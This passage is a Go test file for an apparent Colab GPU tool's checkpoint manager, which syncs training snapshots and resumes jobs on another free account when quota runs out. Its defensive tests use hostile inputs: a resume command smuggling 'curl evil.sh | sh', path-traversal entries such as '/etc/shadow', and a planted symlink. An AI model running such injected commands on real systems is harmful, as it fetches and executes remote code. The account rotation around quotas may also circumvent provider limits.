package checkpoint_test

import (
	"context"
	"encoding/json"
	"errors"
	"math"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/colabhive/colabhive/internal/checkpoint"
	"github.com/colabhive/colabhive/internal/events"
	"github.com/colabhive/colabhive/internal/models"
)

// ============================================================================
// Lightweight In-Memory Test Doubles for RuntimeEngine, AccountPool & Store
// ============================================================================

type fakeRuntime struct {
	mu                sync.Mutex
	accounts          []*models.Account
	sessions          map[string]*models.RuntimeSession
	filesBySess       map[string]map[string][]byte
	execHistory       []models.KernelExecRequest
	experiments       []*models.Experiment
	seq               int
	createSessionCnt  int
	stoppedSessions   []string
	lastStopCtxErr    error
	lastStopHasDeadln bool

	customListFiles    func(ctx context.Context, sessionID, remotePath string) ([]models.RemoteFileEntry, error)
	customDownload     func(ctx context.Context, sessionID, remotePath string) ([]byte, error)
	customUpload       func(ctx context.Context, sessionID, remotePath string, data []byte) error
	customExec         func(ctx context.Context, req models.KernelExecRequest) (*models.KernelExecResult, error)
	listSessionsErr    error
	listExperimentsErr error
}

func newFakeRuntime(accounts []*models.Account) *fakeRuntime {
	return &fakeRuntime{
		accounts:    accounts,
		sessions:    make(map[string]*models.RuntimeSession),
		filesBySess: make(map[string]map[string][]byte),
	}
}

func (f *fakeRuntime) CreateSession(_ context.Context, req models.SessionAllocRequest) (*models.RuntimeSession, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.createSessionCnt++

	excluded := make(map[string]bool)
	for _, id := range req.ExcludedAccountIDs {
		excluded[id] = true
	}

	var chosen *models.Account
	for _, acc := range f.accounts {
		if acc != nil && acc.Enabled && acc.Health.IsSchedulable() && !excluded[acc.ID] {
			chosen = acc
			break
		}
	}
	if chosen == nil {
		return nil, errors.New("no eligible account available")
	}

	f.seq++
	sessID := models.NewPrefixedID("sess_")
	gpu := req.Accelerator
	if gpu == "" {
		gpu = models.AcceleratorT4
	}
	now := time.Now().UTC()
	sess := &models.RuntimeSession{
		ID:           sessID,
		Name:         req.Name,
		AccountID:    chosen.ID,
		AccountEmail: chosen.Email,
		Endpoint:     "demo-gpu-s-test",
		ProxyURL:     "demo://endpoint",
		Accelerator:  gpu,
		Status:       models.SessionIdle,
		BurnRateCUHr: 1.96,
		CreatedAt:    now,
		UpdatedAt:    now,
	}
	f.sessions[sessID] = sess
	f.filesBySess[sessID] = make(map[string][]byte)
	return sess, nil
}

func (f *fakeRuntime) GetSession(_ context.Context, idOrName string) (*models.RuntimeSession, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	s, ok := f.sessions[idOrName]
	if !ok {
		return nil, errors.New("session not found")
	}
	cp := *s
	return &cp, nil
}

func (f *fakeRuntime) ListSessions(_ context.Context, _ models.SessionFilter) ([]*models.RuntimeSession, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.listSessionsErr != nil {
		return nil, f.listSessionsErr
	}
	out := make([]*models.RuntimeSession, 0, len(f.sessions))
	for _, s := range f.sessions {
		cp := *s
		out = append(out, &cp)
	}
	return out, nil
}

func (f *fakeRuntime) SyncRemoteAssignments(context.Context) (*models.SessionSyncResult, error) {
	return &models.SessionSyncResult{}, nil
}

func (f *fakeRuntime) StopSession(ctx context.Context, id string) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.stoppedSessions = append(f.stoppedSessions, id)
	f.lastStopCtxErr = ctx.Err()
	_, f.lastStopHasDeadln = ctx.Deadline()
	if s, ok := f.sessions[id]; ok {
		s.Status = models.SessionStopped
	}
	return nil
}

func (f *fakeRuntime) RestartKernel(context.Context, string) error    { return nil }
func (f *fakeRuntime) InterruptKernel(context.Context, string) error  { return nil }
func (f *fakeRuntime) HotRestartWorker(context.Context, string) error { return nil }
func (f *fakeRuntime) GetColabWebURL(context.Context, string) (string, error) {
	return "https://colab.research.google.com", nil
}

func (f *fakeRuntime) ExecuteCode(ctx context.Context, req models.KernelExecRequest) (*models.KernelExecResult, error) {
	f.mu.Lock()
	f.execHistory = append(f.execHistory, req)
	fn := f.customExec
	f.mu.Unlock()
	if fn != nil {
		return fn(ctx, req)
	}
	return &models.KernelExecResult{
		Session: req.SessionID,
		Status:  "ok",
		Stdout:  "[ok]\n",
	}, nil
}

func (f *fakeRuntime) GetCells(context.Context, string, bool) ([]models.NotebookCell, error) {
	return nil, nil
}
func (f *fakeRuntime) MutateCell(context.Context, string, models.CellMutationRequest) (*models.NotebookCell, *models.KernelExecResult, error) {
	return nil, nil, nil
}

func (f *fakeRuntime) ListFiles(ctx context.Context, sessionID string, remotePath string) ([]models.RemoteFileEntry, error) {
	f.mu.Lock()
	fn := f.customListFiles
	f.mu.Unlock()
	if fn != nil {
		return fn(ctx, sessionID, remotePath)
	}

	f.mu.Lock()
	defer f.mu.Unlock()
	files := f.filesBySess[sessionID]
	if len(files) == 0 {
		return nil, nil
	}
	prefix := path.Clean(remotePath)
	if !strings.HasSuffix(prefix, "/") {
		prefix += "/"
	}
	seenDirs := make(map[string]bool)
	var out []models.RemoteFileEntry
	for fullPath, data := range files {
		if !strings.HasPrefix(fullPath, prefix) {
			continue
		}
		rem := strings.TrimPrefix(fullPath, prefix)
		if slash := strings.IndexByte(rem, '/'); slash >= 0 {
			dirName := rem[:slash]
			if !seenDirs[dirName] {
				seenDirs[dirName] = true
				out = append(out, models.RemoteFileEntry{
					Name: dirName,
					Path: path.Join(remotePath, dirName),
					Type: "directory",
				})
			}
			continue
		}
		out = append(out, models.RemoteFileEntry{
			Name:      rem,
			Path:      fullPath,
			Type:      "file",
			SizeBytes: int64(len(data)),
		})
	}
	return out, nil
}

func (f *fakeRuntime) UploadFile(ctx context.Context, sessionID string, remotePath string, data []byte) error {
	f.mu.Lock()
	fn := f.customUpload
	f.mu.Unlock()
	if fn != nil {
		return fn(ctx, sessionID, remotePath, data)
	}

	f.mu.Lock()
	defer f.mu.Unlock()
	if f.filesBySess[sessionID] == nil {
		f.filesBySess[sessionID] = make(map[string][]byte)
	}
	f.filesBySess[sessionID][path.Clean(remotePath)] = append([]byte(nil), data...)
	return nil
}

func (f *fakeRuntime) DownloadFile(ctx context.Context, sessionID string, remotePath string) ([]byte, error) {
	f.mu.Lock()
	fn := f.customDownload
	f.mu.Unlock()
	if fn != nil {
		return fn(ctx, sessionID, remotePath)
	}

	f.mu.Lock()
	defer f.mu.Unlock()
	files := f.filesBySess[sessionID]
	raw, ok := files[path.Clean(remotePath)]
	if !ok {
		return nil, errors.New("file not found")
	}
	return append([]byte(nil), raw...), nil
}

func (f *fakeRuntime) DeleteFile(context.Context, string, string) error { return nil }
func (f *fakeRuntime) InstallPackages(context.Context, string, []string, string) (*models.KernelExecResult, error) {
	return &models.KernelExecResult{Status: "ok"}, nil
}
func (f *fakeRuntime) LaunchShardedExperiment(context.Context, models.ExperimentLaunchRequest) (*models.Experiment, error) {
	return nil, nil
}
func (f *fakeRuntime) GetExperiment(context.Context, string) (*models.Experiment, error) {
	return nil, nil
}
func (f *fakeRuntime) ListExperiments(context.Context) ([]*models.Experiment, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.listExperimentsErr != nil {
		return nil, f.listExperimentsErr
	}
	return f.experiments, nil
}
func (f *fakeRuntime) CollectAndTeardownExperiment(context.Context, string, bool) (*models.ExperimentTeardownResult, error) {
	return nil, nil
}

type fakePool struct {
	accounts        []*models.Account
	summary         *models.QuotaSummary
	listAccountsErr error
	quotaSummaryErr error
}

func (p *fakePool) StartOAuth(context.Context, models.OAuthStartRequest) (*models.OAuthPendingSession, error) {
	return nil, nil
}
func (p *fakePool) CompleteOAuth(context.Context, string, string) (*models.Account, error) {
	return nil, nil
}
func (p *fakePool) ListAccounts(context.Context) ([]*models.Account, error) {
	if p.listAccountsErr != nil {
		return nil, p.listAccountsErr
	}
	return p.accounts, nil
}
func (p *fakePool) GetAccount(_ context.Context, idOrEmail string) (*models.Account, error) {
	for _, a := range p.accounts {
		if a.ID == idOrEmail || a.Email == idOrEmail {
			return a, nil
		}
	}
	return nil, errors.New("account not found")
}
func (p *fakePool) UpdateAccount(context.Context, string, models.AccountPatch) (*models.Account, error) {
	return nil, nil
}
func (p *fakePool) DeleteAccount(context.Context, string) error { return nil }
func (p *fakePool) RefreshAccountQuota(context.Context, string) (*models.Account, error) {
	return nil, nil
}
func (p *fakePool) RefreshAllQuotas(context.Context) (*models.QuotaSummary, error) {
	return p.summary, nil
}
func (p *fakePool) GetQuotaSummary(context.Context) (*models.QuotaSummary, error) {
	if p.quotaSummaryErr != nil {
		return nil, p.quotaSummaryErr
	}
	if p.summary != nil {
		return p.summary, nil
	}
	return &models.QuotaSummary{AccountsTotal: len(p.accounts)}, nil
}
func (p *fakePool) AcquireAccessToken(context.Context, string) (string, string, error) {
	return "tok", "", nil
}
func (p *fakePool) CanScheduleAccount(*models.Account, models.AcceleratorType) (bool, string) {
	return true, ""
}
func (p *fakePool) MarkGPUEntitlement(context.Context, string, models.AcceleratorType, models.GPUEntitlementStatus, string, time.Duration) error {
	return nil
}
func (p *fakePool) MarkAccountHealth(context.Context, string, models.AccountHealth, string, time.Duration) error {
	return nil
}
func (p *fakePool) RecordAccountCUBurn(context.Context, string, float64) error { return nil }
func (p *fakePool) ListProxies(context.Context) ([]*models.ProxyConfig, error) { return nil, nil }
func (p *fakePool) SaveProxy(context.Context, *models.ProxyConfig) (*models.ProxyConfig, error) {
	return nil, nil
}
func (p *fakePool) DeleteProxy(context.Context, string) error { return nil }
func (p *fakePool) TestProxy(context.Context, string) (*models.ProxyProbeResult, error) {
	return nil, nil
}
func (p *fakePool) ScanLocalCredentials(context.Context) ([]models.DiscoveredLocalCredential, error) {
	return nil, nil
}
func (p *fakePool) ImportCredentials(context.Context, models.CredentialImportRequest) ([]*models.Account, error) {
	return nil, nil
}
func (p *fakePool) ExportVaultBundle(context.Context, models.CredentialExportRequest) (*models.CredentialBundle, error) {
	return nil, nil
}

type fakeWasteStore struct {
	models.Store
	waste           models.SavedWasteStats
	wasteErr        error
	listSessionsErr error
	listExpsErr     error
}

func (s *fakeWasteStore) GetSavedWasteStats(context.Context) (models.SavedWasteStats, error) {
	if s.wasteErr != nil {
		return models.SavedWasteStats{}, s.wasteErr
	}
	return s.waste, nil
}

func (s *fakeWasteStore) ListSessions(context.Context) ([]*models.RuntimeSession, error) {
	if s.listSessionsErr != nil {
		return nil, s.listSessionsErr
	}
	return nil, nil
}

func (s *fakeWasteStore) ListExperiments(context.Context) ([]*models.Experiment, error) {
	if s.listExpsErr != nil {
		return nil, s.listExpsErr
	}
	return nil, nil
}

// ============================================================================
// Tests
// ============================================================================

func TestCheckpointPolicyPersistenceAndValidation(t *testing.T) {
	dataDir := t.TempDir()
	mgr := checkpoint.NewManager(dataDir, nil, nil, nil)

	if checkpoint.MaxCheckpointFileBytes() != 64<<20 {
		t.Fatalf("expected maxCheckpointFileBytes == 64 MiB, got %d", checkpoint.MaxCheckpointFileBytes())
	}

	defPol := mgr.GetPolicy()
	if !defPol.AutoResumeEnabled || defPol.SyncIntervalSec != 60 || defPol.MaxSnapshotsPerJob != 3 {
		t.Fatalf("unexpected default policy: %+v", defPol)
	}

	// Reject path traversal in watch_paths.
	if _, err := mgr.UpdatePolicy(models.CheckpointPolicy{
		AutoResumeEnabled: true,
		WatchPaths:        []string{"/content/../etc/passwd"},
	}); err == nil {
		t.Fatalf("expected error for path traversal in watch_paths")
	}

	updated, err := mgr.UpdatePolicy(models.CheckpointPolicy{
		AutoResumeEnabled:  true,
		SyncIntervalSec:    30,
		WatchPaths:         []string{"/content/checkpoints", "/content/lora_out"},
		MaxSnapshotsPerJob: 5,
	})
	if err != nil {
		t.Fatalf("UpdatePolicy failed: %v", err)
	}
	if updated.SyncIntervalSec != 30 || len(updated.WatchPaths) != 2 {
		t.Fatalf("unexpected updated policy: %+v", updated)
	}

	// Reload from disk and confirm persistence.
	reloaded := checkpoint.NewManager(dataDir, nil, nil, nil)
	pol2 := reloaded.GetPolicy()
	if pol2.SyncIntervalSec != 30 || pol2.MaxSnapshotsPerJob != 5 {
		t.Fatalf("policy did not persist across restart: %+v", pol2)
	}
}

func TestCheckpointSyncAndCrossAccountResumeRelay(t *testing.T) {
	ctx := context.Background()
	dataDir := t.TempDir()
	hub := events.NewHub()
	subCh, unsub := hub.Subscribe(ctx)
	defer unsub()

	accounts := []*models.Account{
		{
			ID:               "acc_alpha01",
			Email:            "alice.private@stanford.edu",
			Alias:            "主力免费号 #1",
			Provider:         models.ProviderColab,
			SubscriptionTier: models.TierFree,
			Health:           models.HealthHealthy,
			Enabled:          true,
		},
		{
			ID:               "acc_beta02",
			Email:            "bob.backup@gmail.com",
			Alias:            "Colab 备用免费号 #2",
			Provider:         models.ProviderColab,
			SubscriptionTier: models.TierFree,
			Health:           models.HealthHealthy,
			Enabled:          true,
		},
	}

	pool := &fakePool{accounts: accounts}
	rt := newFakeRuntime(accounts)
	mgr := checkpoint.NewManager(dataDir, pool, rt, hub)

	// 1. Allocate initial session on Account #1 and write 2 checkpoint files.
	sess1, err := rt.CreateSession(ctx, models.SessionAllocRequest{
		Name:        "flux-lora-train",
		Accelerator: models.AcceleratorT4,
	})
	if err != nil {
		t.Fatalf("CreateSession failed: %v", err)
	}
	if sess1.AccountID != "acc_alpha01" {
		t.Fatalf("expected sess1 on acc_alpha01, got %s", sess1.AccountID)
	}

	weightsBytes := []byte("SAFETENSORS_STEP_800_PAYLOAD")
	stateBytes := []byte(`{"step":800,"loss":0.041}`)
	_ = rt.UploadFile(ctx, sess1.ID, "/content/checkpoints/lora_step_800.safetensors", weightsBytes)
	_ = rt.UploadFile(ctx, sess1.ID, "/content/checkpoints/sub/trainer_state.json", stateBytes)

	// 2. Sync checkpoint into immutable unique `<checkpointsDir>/<ckptID>/` directory.
	rec, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID:     sess1.ID,
		JobID:         "job_lora_flux",
		JobTitle:      "Flux.1 人物 LoRA 微调 (alice.private@stanford.edu)",
		JobKind:       "experiment",
		RemotePath:    "/content/checkpoints",
		ProgressPct:   82.5,
		ResumeCommand: "python3 train.py --resume /content/checkpoints",
	})
	if err != nil {
		t.Fatalf("SyncSessionCheckpoint failed: %v", err)
	}
	if rec.FileCount != 2 {
		t.Fatalf("expected 2 synced files, got %d", rec.FileCount)
	}
	if rec.TotalBytes != int64(len(weightsBytes)+len(stateBytes)) {
		t.Fatalf("expected %d bytes, got %d", len(weightsBytes)+len(stateBytes), rec.TotalBytes)
	}
	if strings.Contains(rec.SourceAccountLabel, "@") || strings.Contains(rec.JobTitle, "alice.private@stanford.edu") {
		t.Fatalf("expected PII-redacted labels, got source=%q title=%q", rec.SourceAccountLabel, rec.JobTitle)
	}
	expectedImmDir := filepath.Join(dataDir, "checkpoints", rec.ID)
	if rec.LocalSnapshotDir != expectedImmDir {
		t.Fatalf("expected immutable snapshot dir %q, got %q", expectedImmDir, rec.LocalSnapshotDir)
	}
	if _, err := os.Stat(filepath.Join(expectedImmDir, "lora_step_800.safetensors")); err != nil {
		t.Fatalf("expected downloaded file in immutable ckptID dir: %v", err)
	}

	// 3. In live mode (DemoMode == false), empty remote dir MUST FAIL loudly (no fake manifest fallback).
	if _, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID:  sess1.ID,
		JobID:      "job_live_empty",
		RemotePath: "/content/empty_dir",
	}); err == nil {
		t.Fatalf("expected live mode empty remote checkpoint sync to fail loudly")
	}

	// DemoMode == true permits synthetic manifest-only snapshot when remote dir is empty.
	demoMgr := checkpoint.NewManagerWithConfig(checkpoint.Config{DataDir: t.TempDir(), DemoMode: true}, pool, rt, nil)
	emptyRec, err := demoMgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID:  sess1.ID,
		JobID:      "job_demo_empty",
		RemotePath: "/content/empty_dir",
	})
	if err != nil {
		t.Fatalf("demo mode empty dir SyncSessionCheckpoint failed: %v", err)
	}
	if emptyRec.FileCount != 1 || emptyRec.TotalBytes == 0 {
		t.Fatalf("expected demo fallback manifest file (count=1), got %+v", emptyRec)
	}

	// 4. Simulate Account #1 preemption & trigger ResumeFromCheckpoint onto Account #2.
	_ = rt.StopSession(ctx, sess1.ID)

	resumed, err := mgr.ResumeFromCheckpoint(ctx, rec.ID, models.CheckpointResumeRequest{
		PreferredGPU: models.AcceleratorT4,
		Strategy:     models.StrategyFreeFirst,
	})
	if err != nil {
		t.Fatalf("ResumeFromCheckpoint failed: %v", err)
	}
	if resumed.Status != "resumed" || resumed.RelayCount != 1 {
		t.Fatalf("expected status=resumed relay_count=1, got %+v", resumed)
	}
	if resumed.ResumedSessionID == "" || resumed.ResumedSessionID == sess1.ID {
		t.Fatalf("expected fresh resumed session ID, got %q", resumed.ResumedSessionID)
	}
	if resumed.LastRelayNoteZh != "原账号掉线/额度耗尽 → 已自动同步快照并在新账号无缝续跑" {
		t.Fatalf("unexpected LastRelayNoteZh: %q", resumed.LastRelayNoteZh)
	}

	// Confirm remote parent directories were created before uploading files.
	rt.mu.Lock()
	sawMkdir := false
	for _, ex := range rt.execHistory {
		if ex.CallerName == "checkpoint-mkdir" && strings.Contains(ex.Env["COLABHIVE_MKDIR_PATHS_JSON"], "/content/checkpoints/sub") {
			sawMkdir = true
			break
		}
	}
	rt.mu.Unlock()
	if !sawMkdir {
		t.Fatalf("expected remote parent directory creation (/content/checkpoints/sub) before upload")
	}

	sess2, err := rt.GetSession(ctx, resumed.ResumedSessionID)
	if err != nil {
		t.Fatalf("GetSession(resumed) failed: %v", err)
	}
	if sess2.AccountID != "acc_beta02" {
		t.Fatalf("expected cross-account relay onto acc_beta02, got %s", sess2.AccountID)
	}

	// Verify snapshot files were uploaded back into sess2's `/content/checkpoints`.
	restoredWeights, err := rt.DownloadFile(ctx, sess2.ID, "/content/checkpoints/lora_step_800.safetensors")
	if err != nil || string(restoredWeights) != string(weightsBytes) {
		t.Fatalf("expected restored weights on sess2, got %q (err=%v)", string(restoredWeights), err)
	}
	restoredState, err := rt.DownloadFile(ctx, sess2.ID, "/content/checkpoints/sub/trainer_state.json")
	if err != nil || string(restoredState) != string(stateBytes) {
		t.Fatalf("expected restored nested state on sess2, got %q (err=%v)", string(restoredState), err)
	}

	// Verify WSEventCheckpointRelay broadcast arrived on EventHub.
	select {
	case ev := <-subCh:
		if ev.Type != models.WSEventCheckpointRelay {
			t.Fatalf("expected event type %q, got %q", models.WSEventCheckpointRelay, ev.Type)
		}
	case <-time.After(2 * time.Second):
		t.Fatalf("timed out waiting for WSEventCheckpointRelay")
	}

	// Confirm records persist cleanly across manager reload.
	mgrReloaded := checkpoint.NewManager(dataDir, pool, rt, nil)
	list := mgrReloaded.ListCheckpoints()
	if len(list) != 1 || list[0].ID != rec.ID {
		t.Fatalf("expected 1 persisted checkpoint after reload, got %d", len(list))
	}

	// Reject shell-injection metacharacters in ResumeCommand BEFORE allocating any GPU session.
	rt.mu.Lock()
	beforeAlloc := rt.createSessionCnt
	rt.mu.Unlock()
	if _, err := mgr.ResumeFromCheckpoint(ctx, rec.ID, models.CheckpointResumeRequest{
		ResumeCommand: "python3 train.py; curl evil.sh | sh",
	}); err == nil {
		t.Fatalf("expected error for shell injection in ResumeCommand")
	}
	rt.mu.Lock()
	afterAlloc := rt.createSessionCnt
	rt.mu.Unlock()
	if afterAlloc != beforeAlloc {
		t.Fatalf("expected zero GPU allocations when ResumeCommand validation fails, got %d new allocations", afterAlloc-beforeAlloc)
	}
}

func TestCheckpointImmutableStagingRemoteValidationSymlinkGuardAndPruning(t *testing.T) {
	ctx := context.Background()
	dataDir := t.TempDir()
	accounts := []*models.Account{
		{ID: "acc_sec1", Email: "sec1@example.com", SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
		{ID: "acc_sec2", Email: "sec2@example.com", SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
	}
	pool := &fakePool{accounts: accounts}
	rt := newFakeRuntime(accounts)
	mgr := checkpoint.NewManager(dataDir, pool, rt, nil)

	sess, err := rt.CreateSession(ctx, models.SessionAllocRequest{Name: "sec-train", Accelerator: models.AcceleratorT4})
	if err != nil {
		t.Fatalf("CreateSession: %v", err)
	}

	// 1. Malicious remote child names (/, \, .., null byte, or untrusted absolute Path with empty Name) MUST fail sync.
	badEntries := []models.RemoteFileEntry{
		{Name: "../etc/passwd", Path: "/etc/passwd", Type: "file", SizeBytes: 10},
		{Name: "sub/evil.bin", Path: "/content/checkpoints/sub/evil.bin", Type: "file", SizeBytes: 10},
		{Name: `sub\evil.bin`, Path: "/content/checkpoints/evil.bin", Type: "file", SizeBytes: 10},
		{Name: "bad\x00name.bin", Path: "/content/checkpoints/bad", Type: "file", SizeBytes: 10},
		{Name: "", Path: "/etc/shadow", Type: "file", SizeBytes: 10},
	}
	for _, bad := range badEntries {
		rt.customListFiles = func(context.Context, string, string) ([]models.RemoteFileEntry, error) {
			return []models.RemoteFileEntry{bad}, nil
		}
		if _, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
			SessionID: sess.ID,
			JobID:     "job_malicious",
		}); err == nil {
			t.Fatalf("expected sync failure for unsafe remote entry %+v", bad)
		}
	}
	if len(mgr.ListCheckpoints()) != 0 {
		t.Fatalf("failed syncs must NEVER publish metadata, got %d records", len(mgr.ListCheckpoints()))
	}

	// 2. Partial download failure MUST fail sync, clean up staged dir, and publish nothing.
	rt.customListFiles = func(context.Context, string, string) ([]models.RemoteFileEntry, error) {
		return []models.RemoteFileEntry{
			{Name: "ok.bin", Path: "/untrusted/ignored/ok.bin", Type: "file", SizeBytes: 4},
			{Name: "broken.bin", Path: "/untrusted/ignored/broken.bin", Type: "file", SizeBytes: 4},
		}, nil
	}
	var downloadedPaths []string
	rt.customDownload = func(_ context.Context, _ string, remotePath string) ([]byte, error) {
		downloadedPaths = append(downloadedPaths, remotePath)
		if strings.HasSuffix(remotePath, "broken.bin") {
			return nil, errors.New("network drop mid-snapshot")
		}
		return []byte("DATA"), nil
	}
	if _, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID: sess.ID,
		JobID:     "job_partial",
	}); err == nil {
		t.Fatalf("expected sync failure on partial download error")
	}
	// Verify remote paths were constructed from validated parent, NEVER trusting VM's `/untrusted/ignored/...`!
	for _, p := range downloadedPaths {
		if !strings.HasPrefix(p, "/content/checkpoints/") {
			t.Fatalf("DownloadFile used untrusted VM path %q instead of validated parent!", p)
		}
	}
	if len(mgr.ListCheckpoints()) != 0 {
		t.Fatalf("partial failure must NOT publish checkpoint metadata")
	}

	// Reset custom hooks and test retention pruning + deferred pruning during active restore.
	rt.customListFiles = nil
	rt.customDownload = nil
	if _, err := mgr.UpdatePolicy(models.CheckpointPolicy{
		AutoResumeEnabled:  true,
		SyncIntervalSec:    60,
		MaxSnapshotsPerJob: 2,
		WatchPaths:         []string{"/content/checkpoints"},
	}); err != nil {
		t.Fatalf("UpdatePolicy: %v", err)
	}

	_ = rt.UploadFile(ctx, sess.ID, "/content/checkpoints/w.bin", []byte("v1"))
	rec1, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{SessionID: sess.ID, JobID: "job_prune"})
	if err != nil {
		t.Fatalf("sync 1: %v", err)
	}
	time.Sleep(15 * time.Millisecond)

	_ = rt.UploadFile(ctx, sess.ID, "/content/checkpoints/w.bin", []byte("v2"))
	rec2, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{SessionID: sess.ID, JobID: "job_prune"})
	if err != nil {
		t.Fatalf("sync 2: %v", err)
	}
	if rec1.LocalSnapshotDir == rec2.LocalSnapshotDir {
		t.Fatalf("expected distinct immutable dirs for rec1 and rec2")
	}
	time.Sleep(15 * time.Millisecond)

	// Third sync exceeds MaxSnapshotsPerJob=2 -> rec1's metadata AND immutable directory MUST be pruned!
	_ = rt.UploadFile(ctx, sess.ID, "/content/checkpoints/w.bin", []byte("v3"))
	rec3, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{SessionID: sess.ID, JobID: "job_prune"})
	if err != nil {
		t.Fatalf("sync 3: %v", err)
	}
	if _, err := os.Stat(rec1.LocalSnapshotDir); !os.IsNotExist(err) {
		t.Fatalf("expected pruned snapshot dir %q to be deleted, stat err=%v", rec1.LocalSnapshotDir, err)
	}
	if _, err := os.Stat(rec2.LocalSnapshotDir); err != nil {
		t.Fatalf("expected retained snapshot dir %q to exist: %v", rec2.LocalSnapshotDir, err)
	}
	if _, err := os.Stat(rec3.LocalSnapshotDir); err != nil {
		t.Fatalf("expected latest snapshot dir %q to exist: %v", rec3.LocalSnapshotDir, err)
	}

	// 3. Symlink-proof restore validation: plant a symlink inside snapshot dir (or remove snapshot dir)
	//    and confirm ResumeFromCheckpoint FAILS BEFORE allocating ANY new GPU VM!
	outsideFile := filepath.Join(t.TempDir(), "secret.txt")
	_ = os.WriteFile(outsideFile, []byte("TOP_SECRET"), 0o600)
	symPath := filepath.Join(rec3.LocalSnapshotDir, "leak_link.txt")
	if symErr := os.Symlink(outsideFile, symPath); symErr == nil {
		rt.mu.Lock()
		beforeAlloc := rt.createSessionCnt
		rt.mu.Unlock()

		if _, rErr := mgr.ResumeFromCheckpoint(ctx, rec3.ID, models.CheckpointResumeRequest{}); rErr == nil {
			t.Fatalf("expected ResumeFromCheckpoint to reject symlink inside snapshot dir")
		}

		rt.mu.Lock()
		afterAlloc := rt.createSessionCnt
		rt.mu.Unlock()
		if afterAlloc != beforeAlloc {
			t.Fatalf("symlink validation MUST reject BEFORE allocating GPU VM (allocated %d)", afterAlloc-beforeAlloc)
		}
		_ = os.Remove(symPath)
	}

	// Also verify missing snapshot dir rejects BEFORE allocating GPU VM (portable even without Windows symlink privilege).
	_ = os.RemoveAll(rec2.LocalSnapshotDir)
	rt.mu.Lock()
	beforeMissingAlloc := rt.createSessionCnt
	rt.mu.Unlock()
	if _, rErr := mgr.ResumeFromCheckpoint(ctx, rec2.ID, models.CheckpointResumeRequest{}); rErr == nil {
		t.Fatalf("expected ResumeFromCheckpoint to fail when local snapshot dir is missing")
	}
	rt.mu.Lock()
	afterMissingAlloc := rt.createSessionCnt
	rt.mu.Unlock()
	if afterMissingAlloc != beforeMissingAlloc {
		t.Fatalf("missing snapshot dir MUST fail BEFORE allocating GPU VM (allocated %d)", afterMissingAlloc-beforeMissingAlloc)
	}

	// 4. Verify deferred pruning: if an older snapshot is actively restoring while newer syncs evict it,
	//    its immutable directory MUST stay intact until the restore finishes, then get pruned automatically!
	inUpload := make(chan struct{})
	releaseUpload := make(chan struct{})
	rt.customUpload = func(_ context.Context, _ string, _ string, _ []byte) error {
		select {
		case inUpload <- struct{}{}:
		default:
		}
		<-releaseUpload
		return nil
	}
	resumeDone := make(chan error, 1)
	go func() {
		_, err := mgr.ResumeFromCheckpoint(ctx, rec3.ID, models.CheckpointResumeRequest{})
		resumeDone <- err
	}()
	<-inUpload

	// While rec3 is actively restoring, push 2 more snapshots so rec3 is evicted under MaxSnapshotsPerJob=2.
	time.Sleep(15 * time.Millisecond)
	_, err = mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{SessionID: sess.ID, JobID: "job_prune"})
	if err != nil {
		t.Fatalf("sync 4: %v", err)
	}
	time.Sleep(15 * time.Millisecond)
	_, err = mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{SessionID: sess.ID, JobID: "job_prune"})
	if err != nil {
		t.Fatalf("sync 5: %v", err)
	}
	// Directory MUST still exist while restore holds the pin!
	if _, statErr := os.Stat(rec3.LocalSnapshotDir); statErr != nil {
		t.Fatalf("expected active-restore snapshot dir %q to remain intact until restore completes: %v", rec3.LocalSnapshotDir, statErr)
	}
	close(releaseUpload)
	if rErr := <-resumeDone; rErr != nil {
		t.Fatalf("in-flight ResumeFromCheckpoint should succeed: %v", rErr)
	}
	rt.customUpload = nil
	// Now that restore completed, deferred pruning MUST have removed rec3's directory!
	if _, statErr := os.Stat(rec3.LocalSnapshotDir); !os.IsNotExist(statErr) {
		t.Fatalf("expected deferred pruning to delete %q after restore finished, statErr=%v", rec3.LocalSnapshotDir, statErr)
	}
}

func TestResumeFailureCleansUpNewSessionWithUncancelledBoundedContext(t *testing.T) {
	ctx := context.Background()
	dataDir := t.TempDir()
	accounts := []*models.Account{
		{ID: "acc_c1", Email: "c1@example.com", SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
		{ID: "acc_c2", Email: "c2@example.com", SubscriptionTier: models.TierFree, Health: models.HealthHealthy, Enabled: true},
	}
	pool := &fakePool{accounts: accounts}
	rt := newFakeRuntime(accounts)
	mgr := checkpoint.NewManager(dataDir, pool, rt, nil)

	sess1, _ := rt.CreateSession(ctx, models.SessionAllocRequest{Name: "train-clean", Accelerator: models.AcceleratorT4})
	_ = rt.UploadFile(ctx, sess1.ID, "/content/checkpoints/model.pt", []byte("WEIGHTS"))
	rec, err := mgr.SyncSessionCheckpoint(ctx, models.CheckpointSyncRequest{
		SessionID:     sess1.ID,
		JobID:         "job_cleanup",
		ResumeCommand: "python3 train.py --resume",
	})
	if err != nil {
		t.Fatalf("SyncSessionCheckpoint: %v", err)
	}

	// Case A: Caller ctx cancels during UploadFile -> newly allocated VM MUST still be stopped using WithoutCancel + bounded deadline!
	reqCtx, cancelReq := context.WithCancel(ctx)
	rt.customUpload = func(_ context.Context, _ string, _ string, _ []byte) error {
		cancelReq()
		return context.Canceled
	}
	if _, rErr := mgr.ResumeFromCheckpoint(reqCtx, rec.ID, models.CheckpointResumeRequest{}); rErr == nil {
		t.Fatalf("expected ResumeFromCheckpoint to fail on upload error")
	}
	rt.mu.Lock()
